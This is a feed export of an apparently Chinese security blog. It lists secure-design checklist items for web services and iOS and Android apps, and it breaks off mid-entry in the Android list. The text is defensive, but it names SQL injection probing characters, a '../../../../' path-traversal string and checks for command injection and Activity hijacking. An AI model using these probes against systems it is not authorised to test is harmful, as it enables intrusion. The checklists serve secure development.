查询，语义净化所有不可信数据的输出 </p></li><li><p>对于操作系统命令，净化所有不可信数据输出</p></li></ul><hr><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><ul><li><p>禁止在异常中泄露敏感信息（敏感数据的范围应该基于应用场景以及产品威胁分析的结果来确定。典型的敏感数据包括口令、银行账号、个人信息、通讯记录、密钥等）</p></li><li><p>禁止在异常中泄露应用服务器的指纹信息（如版本，路径，架构）</p></li><li><p>方法发生异常时要恢复到之前的对象状态（业务操作失败时，进行回滚业务；或者避免去修改对象状态，维持对象状态一致性）</p></li><li><p>I/O操作- 临时文件使用完毕应及时删除</p></li><li><p>不要将Buffer对象封装的数据暴露给不可信代码</p></li><li><p>在多用户系统中创建文件时指定合适的访问许可，以防止未授权的文件访问</p></li><li><p>当一个外部进程通过其输出流对外输出信息或错误时，必须及时清空其输出流，以防止输出流中的缓冲区被耗尽而导致外部进程被阻塞。</p></li><li><p>白名单控制共享目录操作文件权限，比如读/写/可执行权限</p></li></ul><hr><h2 id="三、运行环境"><a href="#三、运行环境" class="headerlink" title="三、运行环境"></a>三、运行环境</h2><ul><li><p>不要使用危险的许可与目标组合（比如不要将AllPermission许可赋予给不信任的代码，不要将ReflectPermission许可和suppressAccessChecks目标组合使用，不要将java.lang.RuntimePermission许可与createClassLoader目标组合）</p></li><li><p>不要禁用JVM字节码验证，如果使用的字节码，如class文件被恶意篡改过，将会存在安全风险</p></li><li><p>建议监控平台不要对互联网开放，仅限于内网环境访问；如果监控平台存在远程执行漏洞，将会给所监控的应用带来安全风险</p></li><li><p>建议将所有安全敏感代码(例如进行权限控制或者用户名密码校验的代码)都放在一个jar包中</p></li><li><p>生产代码不能包含任何调试代码或接口</p></li></ul><hr><h2 id="四、身份验证"><a href="#四、身份验证" class="headerlink" title="四、身份验证"></a>四、身份验证</h2><ul><li><p>除了那些特定设为“公开”的内容以外，对所有的网页和资源都要求进行身份验证，并正确设计身份验证功能</p></li><li><p>所有的身份验证过程必须在服务器后端上执行  </p></li><li><p>在任何可能的情况下，建立并使用标准的、已通过安全测试的身份验证服务(比如 C4A) </p></li><li><p>所有的身份验证控制应当安全的处理未成功的身份验证，比如给出错误模糊提示，隐藏敏感信息</p></li><li><p>登录入口应具有防止暴力猜解及撞库猜解（利用已泄漏的密码字典进行批量登录尝试）的措施，超过设定失败次数需要启用锁定或图片随机码进行访问限制</p></li><li><p>采用https post请求方式传输身份验证的凭据信息</p></li><li><p>身份验证的失败提示信息采用模糊处理，比如可以使用“用户名或密码错误”，而不要使用“用户名错误”或者“密码错误”明确提示。</p></li><li><p>涉及敏感信息或功能的外部系统连接应配置身份验证功能，并进行有效身份验证控制</p></li><li><p>在执行关键操作（如个人信息密码修改操作）时，应对用户身份进行再次验证</p></li><li><p>为高度敏感或重要的交易账户使用多因子身份验证机制，如支付密码、短信验证码等</p></li></ul><hr><h2 id="五、短信验证码"><a href="#五、短信验证码" class="headerlink" title="五、短信验证码"></a>五、短信验证码</h2><ul><li><p>一次一用</p></li><li><p>发送频率控制（建议60s获取一次）</p></li><li><p>验证码有效期（建议60s内有效，发短信时进行友好提示）</p></li><li><p>复杂度（短信验证码建议6位数字）</p></li><li><p>安全提示：是否是个人自己操作等风险提示信息</p></li><li><p>在前端校验（客户端的校验只能作为辅助手段，很容易被绕过），必须使用服务端代码对输入数据进行最终校验</p></li><li><p>短信验证码需要限制频率使用，例如：每天一个手机号码只允许发送5次，防止被黑客恶意消耗短信</p></li><li><p>不同场景的短信验证码不可通用</p></li><li><p>单个短信验证码限制有效验证次数</p></li><li><p>验证码需要对应手机号不可通用</p></li></ul><hr><h2 id="六、图形验证码"><a href="#六、图形验证码" class="headerlink" title="六、图形验证码"></a>六、图形验证码</h2><ul><li><p>一次一用</p></li><li><p>验证码有效期(10分钟内有效，可根据场景兼容安全和体验灵活设置)</p></li><li><p>复杂度（4位及以上数字、字母交替），根据需要也可采用当下流行的拖拽验证码或计算值的验证方式</p></li><li><p>服务器端进行认证</p></li><li><p>从用户体验和安全角度出发，可设计为当用户输3次错误密码后自动弹出验证码输入框进行验证操作</p></li></ul><hr><h2 id="七、密码管理"><a href="#七、密码管理" class="headerlink" title="七、密码管理"></a>七、密码管理</h2><ul><li><p>禁止使用私有或者弱加密算法（比如禁止使用DES，SHA1等，推荐使用AES: 128位，RSA: 2048位，DSA: 2048位）</p></li><li><p>采用基于哈希算法和加入盐值（salt）方式安全存储口令信息</p></li><li><p>密码输入框，可设计为显示密码和隐藏密码切换功能</p></li><li><p>密码重设和更改操作，需要进行二次合法身份验证</p></li><li><p>密码重设时，应对注册手机号和邮箱进行有效验证，链接只能发送到预先注册的邮件地址或预先绑定的手机号</p></li><li><p>临时密码和链接应设计一个短暂的有效期（比如5分钟），防止暴力破解</p></li><li><p>当密码重新设置时，应短信通知用户是否是本人在操作，告知安全风险</p></li><li><p>密码复杂度设置：建议8个字符以上，包含字母、数字及特殊字符等</p></li><li><p>密码设置场景中应具有密码复杂度检查功能</p></li><li><p>密码不能输出到日志和控制台</p></li><li><p>数据库连接配置中的用户密码要以加密的形式存储</p></li><li><p>建议设计密码定期修改提醒机制</p></li></ul><hr><h2 id="八、会话安全"><a href="#八、会话安全" class="headerlink" title="八、会话安全"></a>八、会话安全</h2><ul><li><p>用户登出后应立即清理会话及其相关登录信息</p></li><li><p>注销功能应当完全终止相关的会话或连接</p></li><li><p>增加Cookie 安全性，添加“HttpOnly”和“secure”属性（当“secure”属性设置为true时表示创建的 Cookie 会被以安全的形式向服务器传输，也就是只能在HTTPS 连接中被浏览器传递到服务器端进行会话验证，在 HTTP 连接中不会传递该信息，也就不会存在Cookie被窃取的问题；设置了”HttpOnly”属性，通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样也能减少XSS跨站脚本攻击风险）</p></li><li><p>会话cookie应设计有效期，超时后立即失效</p></li><li><p>当设计允许用户在多渠道终端同时登录时，建议应进行常用设备登录限制</p></li><li><p>为包含已验证的会话标识符的 cookie 设置域和路径，为站点设置一个恰当的限制值。默认cookie的域是当前域名，默认cookie的路径是当前页面的目录路径。如果想要跨域或者在其他的路径下访问cookie就必须要重新设置这两个属性，domain和path。</p></li><li><p>注销功能应当可用于所有受身份验证保护的网页</p></li><li><p>在平衡风险和业务功能需求的基础上，设置一个尽量短的会话超时时间。通常情况下，应当不超过几个小时。</p></li><li><p>不要在URL、错误信息或日志中暴露会话标识符，会话标识符应当只出现在http头信息中，不要将会话标识符以 GET 参数进行传递</p></li><li><p>定期生成一个新的会话标识符并周期性地使上一个会话标识符失效（这可以缓解那些原标识符被获得的特定会话劫持情况） </p></li><li><p>在身份验证的时候，如果连接从 HTTP 变为 HTTPS，则会生成一个新的会话标识符。在应用程序中，推荐持续使用 HTTPS，不应在 HTTP 和 HTTPS 之间来回转换，有效避免切换过程会话被劫持篡改。</p></li><li><p>为服务器端的操作执行标准的安全会话管理，为每个会话执行合法的身份验证和权限控制，防止存在CSRF跨站点请求伪造漏洞</p></li></ul><hr><h2 id="九、访问控制"><a href="#九、访问控制" class="headerlink" title="九、访问控制"></a>九、访问控制</h2><ul><li><p>将具有特权的逻辑从其他应用程序代码中隔离开</p></li><li><p>限制只有授权的用户才能访问文件资源</p></li><li><p>限制只有授权的用户才能访问受保护的URL</p></li><li><p>限制只有授权的用户才能访问受保护的功能或服务</p></li><li><p>建议只有授权的用户才能访问直接对象引用</p></li><li><p>限制只有授权的用户才能访问受保护的应用程序数据</p></li><li><p>限制只有授权的用户才能访问与安全相关的配置信息</p></li><li><p>限制只有授权的外部应用程序或接口才能访问受保护的本地程序或资源</p></li><li><p>服务器端执行的访问控制规则和前端实施的访问控制规则必须匹配</p></li><li><p>服务器中创建文件时需指定合理的访问权限（读/写/可执行）</p></li><li><p>当权限重新设置发生变更时，应记录好日志，并短信通知用户是否是本人在操作，告知可能存在的安全风险</p></li></ul><hr><h2 id="十、日志规范"><a href="#十、日志规范" class="headerlink" title="十、日志规范"></a>十、日志规范</h2><ul><li><p>不要在日志中保存敏感信息，包括系统指纹信息、会话标识符、账号密码、证件、ID等</p></li><li><p>确保日志记录包含了重要的日志事件数据</p></li><li><p>记录所有失败和成功的输入验证 </p></li><li><p>记录所有失败和成功的身份验证记录</p></li><li><p>记录所有失败和成功的访问和操作记录 </p></li><li><p>记录明显的修改事件，包括对于状态数据的修改</p></li><li><p>记录连接无效或者已过期的会话令牌尝试</p></li><li><p>记录所有的管理功能操作行为，包含但不限于安全配置设置的变更</p></li><li><p>记录所有失败和成功的后端连接</p></li><li><p>记录加密模块的错误信息</p></li><li><p>禁止将日志直接保存在可被浏览器访问到的WEB目录中</p></li></ul><hr><h2 id="十一、敏感信息"><a href="#十一、敏感信息" class="headerlink" title="十一、敏感信息"></a>十一、敏感信息</h2><ul><li><p>临时产生的敏感数据（写入内存或文件），应具有及时清除和释放机制</p></li><li><p>不要在 HTTP GET 请求参数中包含敏感信息，如用户名、密码、卡号、ID等</p></li><li><p>禁止表单中的自动填充功能，因为表单中可能包含敏感信息，包括身份验证信息</p></li><li><p>不要在客户端上以明文形式保存密码或其他敏感信息</p></li><li><p>为所有敏感信息采用SSL加密传输</p></li><li><p>禁止将敏感信息（包含加密秘钥等）硬编码在程序中</p></li><li><p>禁止明文存储用户的密码、身份证号、银行卡号、持卡人姓名等敏感信息</p></li><li><p>不要在日志中保存敏感信息，包含但不限于系统详细信息、会话标识符、密码等</p></li><li><p>禁止在异常中泄露应用服务器的指纹信息，如版本，路径，组件版本等</p></li><li><p>禁止将源码或sql上传到开源平台或社区，如github、开源中国等</p></li><li><p>请求中含有敏感参数（如订单号、ID等），应进行混淆方式处理，防止产生参数遍历获取信息风险</p></li><li><p>敏感信息需要展示在web页面上时，应在后台进行敏感字段脱敏处理</p></li><li><p>请求返回数据不应包含请求之外的业务数据，特别是敏感信息数据</p></li></ul><hr><h2 id="十二、密码找回安全"><a href="#十二、密码找回安全" class="headerlink" title="十二、密码找回安全"></a>十二、密码找回安全</h2><ul><li><p>服务器端要做认证，避免绕过前端控制</p></li><li><p>增加二次认证因子，如验证码</p></li><li><p>涉及登录验证token之类的，不要直接将验证内容直接返回给用户</p></li><li><p>认证凭证加密，推荐强算法（推荐使用AES: 128位，RSA: 2048位，DSA: 2048位）</p></li><li><p>认证凭证中的参数应进行混淆处理</p></li><li><p>在多个验证操作中，要对各验证机制进行排序，以防出现跳过前面验证机制直接到最后一步认证的安全风险</p></li><li><p>手机短信码验证，需同时校验手机号和短信是否对应</p></li><li><p>输入框中，应校验输入数据合法性，防止产生XSS跨站脚本攻击</p></li><li><p>密码找回链接限制有效访问时间和复用次数（不可重复使用）</p></li></ul><hr><h2 id="十三、SQL注入"><a href="#十三、SQL注入" class="headerlink" title="十三、SQL注入"></a>十三、SQL注入</h2><ul><li><p>永远不要信任用户的输入，要对用户的所有输入进行校验，包含SQL语句的过滤和转义</p></li><li><p>永远不要使用动态拼装SQL，可以使用参数化的SQL或者使用存储过程进行数据查询存取</p></li><li><p>永远不要使用管理员权限进行数据库连接，为每个应用使用单独的非特权权限，且配置有限的数据库连接数</p></li><li><p>不要把敏感信息明文存放，采用加密或者哈希、混淆等方式对敏感信息进行脱敏存储</p></li><li><p>应用的异常信息应不带有敏感信息，给出尽可能少的提示；建议使用自定义的错误信息对原始错误信息进行包装，可把异常信息存放在独立的数据库表中</p></li><li><p>XML注入- 不要使用字符串/StringBuffer/StringBuilder/StringFormat组装XML</p></li><li><p>建议对XML元素属性或者内容进行转义</p></li></ul><hr><h2 id="十四、XSS跨站脚本攻击"><a href="#十四、XSS跨站脚本攻击" class="headerlink" title="十四、XSS跨站脚本攻击"></a>十四、XSS跨站脚本攻击</h2><ul><li><p>对输入的数据进行过滤和转义，包含但不限于&lt; &gt;” ‘ % ( ) &amp; + \ \’ \”等危险特殊字符</p></li><li><p>数据添加到html元素属性或者内容中时，对数据进行HTML转义</p></li><li><p>数据添加到script脚本中时，对数据进行script转义</p></li><li><p>数据添加到style中时，对数据进行css转义</p></li></ul><hr><h2 id="十五、CSRF跨站请求伪造"><a href="#十五、CSRF跨站请求伪造" class="headerlink" title="十五、CSRF跨站请求伪造"></a>十五、CSRF跨站请求伪造</h2><ul><li><p>建议在每个关键表单中引入了CSRF Token验证(会话中生成的随机串，提交后校验)</p></li><li><p>在关键表单提交时要求用户进行二次身份验证（录入密码、插KEY、输入图片验证码、短信验证码）</p></li><li><p>对请求referer做验证（比如跨域、系统内部应用）</p></li></ul><hr><h2 id="十六、文件上传安全"><a href="#十六、文件上传安全" class="headerlink" title="十六、文件上传安全"></a>十六、文件上传安全</h2><ul><li><p>上传操作应设计身份验证机制，并进行合法身份校验</p></li><li><p>只允许上传满足业务需要的相关文档类型</p></li><li><p>通过检查文件头信息，比如JPEG (jpg)文件头信息（十六进制）：FFD8FF，验证上传文档是否是所期待的类型</p></li><li><p>不要把文件保存在与应用程序相同的 Web 环境中，建议将文件保存在专用的文档服务器中，单独给文档服务器配置域名访问更好</p></li><li><p>限制上传任意可能被 Web 服务器解析的文件 ，比如jsp、php等 </p></li><li><p>上传文件以二进制形式下载，建议不提供直接访问（防止木马文件直接执行）</p></li><li><p>禁止授予上传文件存储目录的可执行权限 </p></li><li><p>禁止客户端自定义文件上传/下载路径（如：使用../../../../进行跳转）</p></li><li><p>文件上传后重命名（需根据业务实际需求制定命名规则）</p></li></ul><hr><h2 id="十七、组件安全"><a href="#十七、组件安全" class="headerlink" title="十七、组件安全"></a>十七、组件安全</h2><ul><li><p>在使用随机数函数时，推荐使用强随机数函数（例如java.security.SecureRandom类）</p></li><li><p>精简组件中不需要的功能、方法，以免带来未知的安全风险</p></li><li><p>不可将系统内部使用的锁对象暴露给不可信代码</p></li><li><p>建议使用SSL Socket代替Socket来进行安全数据交互</p></li><li><p>封装本地方法调用（所有的本地方法都应该被定义为私有的，然后仅通过一个封装方法来调用）</p></li><li><p>使用安全管理器（比如java.security或第三方安全组件）来保护敏感操作</p></li><li><p>编写自定义类加载器必须覆盖getPermissions()函数时，在为代码源分配任意权限前，应调用超类super.getPermissions（）函数，实现除了自定义策略外，系统全局的默认安全策略也被应用。</p></li><li><p>避免完全依赖URLClassLoader和java.util.jar提供的默认自动签名认证机制，应从加载类的代码源（Code-Source）中获取证书链，然后检查证书是否属于本地密钥库（KeyStore）中的受信任签名者</p></li></ul><hr><h2 id="十八、接口安全"><a href="#十八、接口安全" class="headerlink" title="十八、接口安全"></a>十八、接口安全</h2><ul><li><p>调用方来源IP控制，比如可通过防火墙、主机host deny、Nginx deny等技术措施进行实施</p></li><li><p>调用方身份认证，比如key、secret、证书等技术措施进行实施</p></li><li><p>调用参数认证，需设计参数容错机制，避免出现参数可遍历敏感数据安全问题</p></li><li><p>采用数字签名保障接口身份来源可信，数据防篡改</p></li><li><p>调用方权限控制设置</p></li><li><p>调用频率、有效期进行控制</p></li><li><p>调用行为实时检测，对异常阻拦</p></li><li><p>幂等性校验，保持数据一致性</p></li><li><p>采用应用接入安全网关，实现APPID/KEY身份认证，加密传输，摘要签名安全保障</p></li></ul><hr><h2 id="十九、Dubbo调用安全"><a href="#十九、Dubbo调用安全" class="headerlink" title="十九、Dubbo调用安全"></a>十九、Dubbo调用安全</h2><ul><li><p>采用token验证访问控制，防止消费者绕过注册中心访问提供者；在注册中心控制权限以决定要不要下发令牌给消费者</p></li><li><p>采用filter IP白名单访问控制，同时也可预防生产系统和测试系统之间Dubbo混乱调用问题</p></li><li><p>在必要情况下（如敏感信息操作），连接注册中心Dubbo时要进行用户名和密码校验</p></li></ul><hr><h2 id="二十、Redis调用安全"><a href="#二十、Redis调用安全" class="headerlink" title="二十、Redis调用安全"></a>二十、Redis调用安全</h2><ul><li><p>应启用客户端IP访问控制验证功能</p></li><li><p>应启用客户端身份验证功能</p></li><li><p>敏感信息不要明文存储于Redis</p></li></ul><hr><blockquote><p>本文引自<a href="https://www.sdlchina.org.cn/2.sdl%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3/SDL-1-%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1Checklist/" target="_blank" rel="noopener">SDL China</a> —— 中国互联网一线安全工程师编写整理</p></blockquote>]]></content>
    
    <summary type="html">
    
      安全设计是SDL第一步需要检查的内容，所以第一步一定要做好。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
      <category term="Checklist" scheme="https://www.diyz.bid/tags/Checklist/"/>
    
  </entry>
  
  <entry>
    <title>ios安全Checklist</title>
    <link href="https://www.diyz.bid/Security/ios%E5%AE%89%E5%85%A8Checklist/"/>
    <id>https://www.diyz.bid/Security/ios安全Checklist/</id>
    <published>2018-08-23T09:10:57.000Z</published>
    <updated>2018-10-11T10:12:52.889Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>项目</p><ul><li>评级 内部评级 扫描器可否检测</li><li>检测方法</li><li>危害</li><li>备注</li></ul></li><li><p>不安全的存储</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒和 KeyChain 保护私有数据和身份凭据。</li><li>攻击者可通过企业证书诱骗安装恶意应用，对未妥善使用沙箱保护的数据进行获取，实现进一步控制用户账户等目的。</li></ul></li><li><p>不安全的服务端 SSL 部署</p><ul><li>高 具体分析 yes</li><li>分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。</li><li>不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。</li></ul></li><li><p>不正确的证书校验</p><ul><li>高 中 调研</li><li>静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。</li><li>客户端不正确的证书校验可导致被中间人攻击。</li></ul></li><li><p>未使用 SSL Pinning</p><ul><li>高 低 调研</li><li>静态分析程序是否采用了 SSL Pinning。</li><li>攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。</li><li>iOS 上的证书安装比 Android 简单很多</li></ul></li><li><p>不安全的 ATS 配置</p><ul><li>高 低 yes</li><li>静态分析程序是否允许任意内容使用非 SSL 载入。</li><li>开启 NSAllowsArbitraryLoads 允许任意内容通过明文传送，可能导致中间人攻击；此外 AppStore 将加强对此选项的限制，可能导致上架困难。</li></ul></li><li><p>密码学实现问题</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向密码学相关函数调用，检查是否存在错误的密码学实现，如硬编码的对称加密密钥或强度不足的单向散列函数。</li><li>错误的密码学功能实现将导致加密强度显著降低，结合其他问题进一步攻击应用程序。</li></ul></li><li><p>不安全的用户认证</p><ul><li>高 具体分析 no</li><li>静态分析应用程序逻辑和动态跟踪结合，逆向用户认证过程，检查是否存在逻辑和实现漏洞。</li><li>不安全的用户认证可能导致用户身份被冒用、撞库攻击等，危害帐号安全。</li></ul></li><li><p>客户端 SQL 注入</p><ul><li>具体分析 具体分析 调研</li><li>按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。</li><li>攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。</li></ul></li><li><p>内网 IP 泄漏</p><ul><li>低 低 yes</li><li>静态分析应用程序的代码中是否包含了硬编码的服务端私有地址。</li><li>攻击者可使用得到的地址，结合其他服务端应用对内网发起 SSRF 等类型的攻击。</li></ul></li><li><p>客户端路径穿越</p><ul><li>高 具体分析 调研</li><li>静态分析应用程序逻辑，以及动态跟踪程序执行。</li><li>攻击者可使用路径穿越问题访问应用的私有数据。</li></ul></li><li><p>未启用地址随机化</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查是否启用 PIE 保护。</li><li>未开启 PIE 的应用将降低内存破坏类漏洞的利用难度。</li></ul></li><li><p>未启用栈 cookie</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查标志位是否启用 Stack Canary 保护。</li><li>未开启 Stack Canary 的应用将更容易受到栈溢出漏洞的攻击。</li></ul></li><li><p>未启用 ARC</p><ul><li>高 低 yes</li><li>静态分析应用可执行文件，检查是否启用 Automatic Reference Counting 管理对象。</li><li>ARC 是 Objective C 中对象内存管理的机制，开启后可以减少手动管理内存而导致的对象引用问题。</li></ul></li><li><p>URL Scheme 滥用</p><ul><li>具体分析    具体分析 no</li><li>静态分析 URL Scheme 处理历程和动态模糊测试，判断程序在处理 URL Scheme 时是否存在可以被攻击的流程。</li><li>攻击者可以使用网页等方式唤起应用，执行特定的流程触发漏洞。</li></ul></li><li><p>第三方代码问题</p><ul><li>具体分析 具体分析 调研</li><li>检测第三方 SDK 和程序引用及其版本，检查是否存在已知安全漏洞、后门甚至恶意代码（如 XCodeGhost）。</li><li>程序通过 SDK 等方式引入的第三方代码，如包含后门、漏洞等，将直接影响到应用本身的安全，且难以自行修复。</li><li>基于 cocoapods 的第三方代码检测？</li></ul></li><li><p>敏感内容输出到日志</p><ul><li>具体分析 低 调研</li><li>使用静态分析和动态运行相结合，检查应用是否将敏感信息输出到日志中。</li><li>攻击者可读取系统日志跨应用获取信息。    hook 很容易实现，问题是如何判断信息敏感？</li></ul></li><li><p>未启用键盘记录保护</p><ul><li>中 低 调研</li><li>静态分析应用可执行文件，结合动态跟踪，根据应用安全性要求判断是否需要对特定输入控件添加自定义软键盘。</li><li>系统键盘可能导致第三方应用读取键盘缓存获取用户名，或使用屏幕录制截取用户输入。</li><li>基于 hook 实现？</li></ul></li><li><p>敏感应用未进行越狱检测</p><ul><li>低 低 调研</li><li>静态分析应用逻辑结合越狱设备实机安装，判断应用是否根据自身需求对越狱环境进行检测，以及告知用户潜在的风险。</li><li>在越狱设备上将极大增加 App 的攻击面，恶意软件可以使用非公开 API、Hook 等技术绕过应用沙盒，获取用户 token、登录凭据等敏感信息。</li><li>静态查询是否包含符号、特殊字符串</li></ul></li><li><p>访问控制不当</p><ul><li>低 具体分析 yes</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用访问控制模型是否符合安全性要求。</li><li>错误的访问控制策略可能导致用户敏感信息遭到泄露。</li></ul></li><li><p>逻辑缺陷</p><ul><li>具体分析 具体分析 no</li><li>静态分析应用可执行文件，结合动态跟踪，分析应用是否存在可以被攻击利用的逻辑错误。</li><li>逻辑错误将导致应用出现非设计预期的行为。</li></ul></li><li><p>未对系统截图做保护</p><ul><li>低 低 no</li><li>检查应用进入后台是否会保存屏幕截图。    当程序进入后台的截屏包含敏感信息可能导致隐私泄露。</li></ul></li><li><p>敏感数据明文传输</p><ul><li>高 中 no</li><li>检查应用与服务器通信数据包中敏感信息是否加密。</li><li>当用户遭受中间人攻击时，如果敏感信息明文传输将导致信息泄露。</li></ul></li><li><p>敏感数据允许使用剪贴板</p><ul><li>中 低 no</li><li>检查应用敏感数据是否可复制。</li><li>iOS系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。</li></ul></li><li><p>错误页面泄露敏感信息</p><ul><li>具体分析 低 no</li><li>检查应用异常状态下，错误信息是否包含敏感数据。</li><li>错误页面中不必要的输出可能导致信息泄露，或者为攻击者提供额外信息。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      本文中列出了ios应用中需要关注的安全项目清单。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
      <category term="Checklist" scheme="https://www.diyz.bid/tags/Checklist/"/>
    
      <category term="ios" scheme="https://www.diyz.bid/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Android安全Checklist</title>
    <link href="https://www.diyz.bid/Security/Android%E5%AE%89%E5%85%A8Checklist/"/>
    <id>https://www.diyz.bid/Security/Android安全Checklist/</id>
    <published>2018-08-23T09:10:35.000Z</published>
    <updated>2018-10-11T10:12:52.865Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>项目</p><ul><li>评级 内部评级 扫描器可否检测</li><li>检测方法</li><li>危害</li><li>备注</li></ul></li><li><p>应用可以被调试</p><ul><li>高    低      yes</li><li>检查样式清单，是否允许被调试。检查应用是否使用反调试技巧防止被附加调试。</li><li>可以被调试的应用将降低对应用逆向工程的成本。</li></ul></li><li><p>应用可以被备份</p><ul><li>高 低     yes</li><li>检查样式清单，是否允许被备份。</li><li>在开启 USB 调试的设备上可备份应用和数据，在设备没有 root 的情况下访问私有数据目录。</li></ul></li><li><p>ContentProvider权限问题</p><ul><li>具体分析    具体分析  yes    </li><li>检查样式清单，是否为 ContentProvider 设置了足够的权限限制。</li><li>攻击者可以不受限制地访问敏感的 ContentProvider，获取私有数据或权限提升。</li></ul></li><li><p>冗余的权限</p><ul><li>低 低 yes</li><li>检查样式清单，是否注册了冗余的权限。</li><li>冗余的权限将导致在发生代码执行漏洞时，攻击者可以获得更多的应用权限。</li><li>Android 在新版废弃了一些权限，即使加上也不能使用相关功能。 <a href="https://developer.android.com/reference/android/Manifest.permission.html#READ_LOGS" target="_blank" rel="noopener">https://developer.android.com/reference/android/Manifest.permission.html#READ_LOGS</a></li></ul></li><li><p>代码可被重打包</p><ul><li>高 低 yes</li><li>解包应用，篡改内容并重新签名，判断程序是否对反编译工具添加了处理，以及对自身完整性进行校验。</li><li>重打包可能导致仿冒应用出现在市场中，威胁用户安全。</li></ul></li><li><p>客户端 SQL 注入</p><ul><li>高 具体分析 调研</li><li>按照可显注入、报错注入、盲注的方式检测，通过添加 ’, ”, +, and, or, xor 等闭合符号，逻辑字符判断 SQL 注入漏洞是否存在。</li><li>攻击者利用本地 SQL 注入漏洞，可能导致获取数据库中的敏感信息，实现进一步控制用户账户的等目的。</li><li>需要找到可执行路径</li></ul></li><li><p>不安全的存储</p><ul><li>具体分析 具体分析 yes</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据和权限，判断应用是否合理使用沙盒保护私有数据和身份凭据，是否有将敏感信息输出到扩展存储（TF 卡等）的行为。</li><li>错误的数据存储可能导致攻击者可以跨应用获取敏感数据。</li></ul></li><li><p>明文存储密码</p><ul><li>中 具体分析 调研</li><li>静态分析应用程序逻辑，以及在设备上安装程序检查其数据目录。</li><li>明文存储密码可导致应用更易受到取证工具攻击。</li></ul></li><li><p>不安全的服务端 SSL 部署</p><ul><li>高 具体分析 yes</li><li>分析通信 API 服务端，检查是否启用加密连接、是否使用过时的加密套件、是否存在已知的加密套件漏洞、密钥强度是否达到要求。</li><li>不安全的服务端 SSL 部署将导致加密强度达不到要求，或受到已知攻击方式的威胁，从而让攻击者破解密钥，实现中间人攻击。</li></ul></li><li><p>敏感数据明文传输</p><ul><li>高 中 调研</li><li>分析应用与后台服务器通信数据中敏感数据是否为明文传输。</li><li>当用户遭受中间人攻击时可能导致信息泄露。</li></ul></li><li><p>不正确的证书校验</p><ul><li>高 中 yes</li><li>静态分析程序是否正确地使用了 SSL 证书校验，是否验证了证书的域名、发行者、有效期。</li><li>客户端不正确的证书校验可导致被中间人攻击。</li></ul></li><li><p>未使用 SSL Pinning</p><ul><li>中 低 调研</li><li>静态分析程序是否采用了 SSL Pinning。</li><li>攻击者可以在网页中提供根证书下载，诱导受害者安装信任，从而让 App 即使使用了正确的证书校验 Api 流程后依然可以被攻击者完全解密流量，实现中间人攻击。</li><li>Android 下面安装证书很麻烦</li></ul></li><li><p>WebView 安全</p><ul><li>高 具体分析 yes</li><li>静态分析应用程序逻辑和动态跟踪结合，检查是否存在 WebView 对象注入漏洞和错误地使用 WebView 相关功能，如未禁止记住密码、允许 Javascript 访问本地域、忽略证书错误等。</li><li>WebView 的风险问题可能导致用户在浏览页面时被恶意安装应用、窃取隐私文件。</li></ul></li><li><p>应用卸载无法删除缓存数据</p><ul><li>中 低 调研</li><li>检查应用保存缓存数据位置及卸载逻辑。</li><li>如果缓存数据包含敏感信息，可能存在信息泄露风险。</li></ul></li><li><p>敏感信息允许使用剪贴板</p><ul><li>中 低 no</li><li>检查应用敏感信息是否可被用户复制。</li><li>Android 系统剪贴板可以被任意应用访问，如果允许用户复制敏感数据则存在信息泄露风险。</li></ul></li><li><p>本地认证绕过</p><ul><li>高 具体分析 no</li><li>静态分析本地认证措施（如手势密码等）是否可以被绕过。</li><li>逻辑问题可能导致本地认证绕过，在物理接触设备的情况下获取用户隐私或身份凭据。</li></ul></li><li><p>本地 socket 端口</p><ul><li>具体分析 具体分析 yes</li><li>检查是否可以伪造数据与本地 socket 端口进行通信，以及响应逻辑是否存在可利用的漏洞。</li><li>通过伪造数据可以任意触发 socket 服务端逻辑。</li></ul></li><li><p>Activity 劫持</p><ul><li>高 具体分析 yes</li><li>静态分析应用结合动态跟踪，检查是否可以劫持界面进行钓鱼攻击。</li><li>Activity 劫持可实现劫持界面，诱骗用户输入密码等关键信息</li></ul></li><li><p>命令注入</p><ul><li>高 具体分析 yes</li><li>检查应用是否存在命令注入</li><li>命令注入可导致任意命令执行</li></ul></li><li><p>使用隐式 Intent 动态授予 URI 权限</p><ul><li>具体分析 具体分析 yes</li><li>检查使用动态授予 URI 权限的 Intent 是否为显式。</li><li>当授予 ContentProvider 读或写权限的 Intent 